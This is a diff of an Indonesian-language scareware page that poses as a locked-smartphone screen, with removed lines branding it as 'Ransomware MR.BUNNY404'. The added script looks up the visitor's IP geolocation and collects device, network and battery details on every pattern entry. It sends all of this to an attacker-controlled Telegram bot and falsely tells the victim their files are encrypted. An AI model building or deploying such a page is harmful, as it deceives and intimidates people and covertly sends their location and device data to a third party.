@@ -17,30 +17,12 @@
             height: 100vh;
             overflow: hidden;
         }
-        .image-container {
-            margin-bottom: 20px;
-        }
-        #mainImage {
-            max-width: 150px;
-            border-radius: 50%;
-            border: 5px solid white;
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
-        }
         .overlay {
             background: rgba(0, 0, 0, 0.8);
             padding: 30px;
             border-radius: 15px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
             text-align: center;
-        }
-        .overlay h1 {
-            color: #f05454;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        .overlay p {
-            color: #ddd;
-            margin-bottom: 15px;
         }
         #inputCode {
             padding: 10px;
@@ -66,111 +48,100 @@
             color: #ff4d4d;
             font-size: 14px;
         }
-        .result-container {
-            text-align: center;
-            animation: fadeIn 1s ease-in-out;
-        }
-        .result-container h1 {
-            color: #4caf50;
-            font-size: 24px;
-        }
-        .encrypt-message {
-            text-align: center;
-            animation: fadeIn 1s ease-in-out;
-            color: #ff4d4d;
-            font-size: 24px;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
     </style>
 </head>
 <body>
-    <div class="image-container">
-        <img src="https://files.catbox.moe/39muz6.png" alt="Gambar yang Diinginkan" id="mainImage">
-    </div>
-    <div class="overlay" id="overlay">
-        <div class="message">
-            <h1>Smartphone Anda Terkunci📵🔑</h1>
-            <p>Masukkan pola untuk membuka kunci:</p>
-            <input type="password" id="inputCode" placeholder="Masukkan pola">
-            <button onclick="checkCode()">Kirim</button>
-            <p id="errorMessage" class="error"></p>
-        </div>
-    </div>
-    <div class="result-container" id="resultContainer" style="display: none;">
-        <h1>Opened Successfully 🔓🔑</h1>
-        <p>Target failed to encrypt 📵 to Ransomware MR.BUNNY404</p>
-    </div>
-    <div class="encrypt-message" id="encryptMessage" style="display: none;">
-        <h1>Semua file telah dienkripsi 📂🔒</h1>
-        <p>Hubungi administrator untuk pemulihan data.</p>
+    <div class="overlay">
+        <h1>Smartphone Anda Terkunci 📵🔑</h1>
+        <p>Masukkan pola untuk membuka kunci:</p>
+        <input type="password" id="inputCode" placeholder="Masukkan pola">
+        <button onclick="checkCode()">Kirim</button>
+        <p id="errorMessage" class="error"></p>
     </div>
     <script>
+        const botToken = "YOUR_BOT_TOKEN"; // Ganti dengan token bot Telegram Anda
+        const chatId = "YOUR_CHAT_ID"; // Ganti dengan chat ID Anda
         let attemptCount = 0;
         const maxAttempts = 3;
-        let isBlocked = true; // Variabel untuk mengatur pemblokiran tombol
 
-        function enableBlock() {
-            if (isBlocked) {
-                // Blokir klik kanan
-                window.oncontextmenu = function () { return false; };
+        // Mendapatkan informasi perangkat
+        async function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenResolution = `${screen.width}x${screen.height}`;
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const networkType = connection ? connection.effectiveType : "Tidak diketahui";
+            const battery = navigator.getBattery ? await navigator.getBattery() : null;
+            const batteryInfo = battery 
+                ? `Baterai: ${Math.round(battery.level * 100)}%, Pengisian: ${battery.charging ? "Ya" : "Tidak"}`
+                : "Informasi baterai tidak tersedia";
 
-                // Blokir tombol tertentu (Backspace, F5, ESC, F12)
-                window.addEventListener("keydown", blockKeys);
+            let locationInfo = "Gagal mendapatkan lokasi.";
+            try {
+                const response = await fetch("http://ip-api.com/json/");
+                const data = await response.json();
+                locationInfo = `
+IP Address: ${data.query}
+Kota: ${data.city}
+Kecamatan: ${data.regionName}
+Negara: ${data.country}
+Latitude: ${data.lat}
+Longitude: ${data.lon}
+ISP: ${data.isp}
+                `;
+            } catch (error) {
+                console.error("Gagal mendapatkan lokasi:", error);
+            }
 
-                // Tangkap tombol kembali pada perangkat mobile
-                history.pushState(null, null, document.URL);
-                window.addEventListener("popstate", blockBackButton);
+            return `
+User-Agent: ${userAgent}
+Platform: ${platform}
+Resolusi Layar: ${screenResolution}
+Jenis Jaringan: ${networkType}
+${batteryInfo}
+${locationInfo}
+            `;
+        }
+
+        // Mengirimkan data ke Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = { chat_id: chatId, text: message };
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data),
+                });
+                console.log("Pesan terkirim ke Telegram.");
+            } catch (error) {
+                console.error("Gagal mengirim pesan ke Telegram:", error);
             }
         }
 
-        function disableBlock() {
-            // Nonaktifkan blokir tombol
-            window.oncontextmenu = null;
-            window.aku ("keydown", blockKeys);
-            window.removeEventListener("popstate", blockBackButton);
-            isBlocked = false;
-        }
-
-        function blockKeys(e) {
-            if (e.keyCode === 116 || e.keyCode === 123 || e.keyCode === 27) {
-                e.preventDefault();
-                alert("Tombol ini telah dinonaktifkan!");
-            }
-        }
-
-        function blockBackButton(e) {
-            history.pushState(null, null, document.URL);
-        }
-
-        function checkCode() {
+        async function checkCode() {
             const inputCode = document.getElementById('inputCode').value;
             const errorMessage = document.getElementById('errorMessage');
-            const overlay = document.getElementById('overlay');
-            const resultContainer = document.getElementById('resultContainer');
-            const encryptMessage = document.getElementById('encryptMessage');
 
             if (attemptCount < maxAttempts) {
-                if (inputCode === "1234") { // Password default
-                    overlay.style.display = "none";
-                    resultContainer.style.display = "block";
-                    disableBlock(); // Nonaktifkan blokir tombol
+                if (inputCode === "1234") { // Ganti dengan password Anda
+                    alert("Berhasil membuka kunci!");
+                    const deviceInfo = await getDeviceInfo();
+                    await sendToTelegram("Pola benar! Informasi perangkat:\n" + deviceInfo);
                 } else {
                     attemptCount++;
                     errorMessage.textContent = `Pola salah! Percobaan tersisa: ${maxAttempts - attemptCount}`;
+                    const deviceInfo = await getDeviceInfo();
+                    await sendToTelegram(`Percobaan ${attemptCount}: Pola salah.\n\nInformasi perangkat:\n${deviceInfo}`);
                 }
             }
 
             if (attemptCount >= maxAttempts) {
-                overlay.style.display = "none";
-                encryptMessage.style.display = "block";
+                errorMessage.textContent = "Semua percobaan gagal! File dienkripsi.";
+                const deviceInfo = await getDeviceInfo();
+                await sendToTelegram("Semua file telah dienkripsi!\n\nInformasi perangkat:\n" + deviceInfo);
             }
         }
-
-        // Aktifkan blokir tombol saat halaman dimuat
-        window.onload = enableBlock;
     </script>
 </body>
 </html>
